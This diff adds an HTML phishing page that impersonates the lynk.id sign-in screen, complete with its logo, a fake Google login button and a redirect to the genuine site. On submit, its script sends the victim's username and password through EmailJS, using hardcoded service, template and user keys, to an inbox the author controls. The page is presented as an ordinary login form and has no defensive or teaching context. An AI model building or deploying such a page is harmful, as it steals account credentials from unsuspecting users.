@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init("pSW-WU1hdJGh-OKJI"); // Replace with your EmailJS user ID
+        })();
+    </script>
+</head>
+
+<body class="bg-green-50 flex items-center justify-center min-h-screen">
+    <div class="w-full max-w-md mx-auto bg-white p-8 rounded-lg shadow-lg">
+        <div class="text-center mb-6">
+            <div class="mb-2 flex justify-center">
+                <img src="logo.png" alt="logo lynkid" class="mr-1" width="250" height="20" />
+            </div>
+            <p class="text-gray-1100 mt-0">
+                Sign in to your account
+            </p>
+        </div>
+        <form onsubmit="sendEmail(event)">
+            <div class="mb-4">
+                <label class="block text-gray-700" for="username">Username / E-mail</label>
+                <input id="username" type="text" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400" placeholder="Username" required />
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700" for="password">Password</label>
+                <div class="flex justify-between items-center">
+                    <input id="password" type="password" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400" placeholder="Password" required />
+                    <a class="text-sm text-green-500 ml-2" href="#">Forgot Password?</a>
+                </div>
+            </div>
+            <div class="mb-6">
+                <button type="submit" class="w-full bg-green-500 text-white py-2 rounded-lg hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-400">Sign In</button>
+            </div>
+            <p id="message" class="text-center mt-2" style="display: none;"></p>
+            <div class="mb-6">
+                <button class="w-full bg-white border border-gray-300 text-gray-700 py-2 rounded-lg flex items-center justify-center hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300" type="button">
+                 <img alt="Google logo" class="mr-2" height="20" src="google.png" width="50"/>
+                 Continue with Google
+                </button>
+               </div>
+        </form>
+        <div class="text-center mt-4">
+            <p class="text-gray-600">
+                Don't have an account?
+                <a class="text-green-500" href="#">Register</a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        async function sendEmail(event) {
+            event.preventDefault(); // Prevent form from refreshing the page
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var submitButton = document.querySelector("button[type='submit']");
+            var messageElement = document.getElementById("message");
+
+            clearMessages(); // Clear previous messages
+
+            // Validate input
+            if (!username || !password) {
+                displayMessage("Both fields are required.", "error");
+                return;
+            }
+
+            try {
+                submitButton.disabled = true;
+                submitButton.textContent = "Sending...";
+
+                // Send email using EmailJS
+                await emailjs.send("service_iy6jj6p", "template_aeoiycn", { username, password });
+
+                displayMessage("Email sent successfully!", "success");
+            } catch (error) {
+                displayMessage("Failed to send email. Please try again.", "error");
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = "Sign In";
+            }
+
+            setTimeout(() => {
+                window.location.href = 'https://lynk.id';
+            }, 1000);
+        }
+
+        function displayMessage(message, type) {
+            var messageElement = document.getElementById("message");
+            messageElement.textContent = message;
+            messageElement.className = type === "success" ? "text-green-500" : "text-red-500";
+            messageElement.style.display = "block";
+        }
+
+        function clearMessages() {
+            var messageElement = document.getElementById("message");
+            messageElement.textContent = "";
+            messageElement.style.display = "none";
+        }
+    </script>
+</body>
+
+</html>
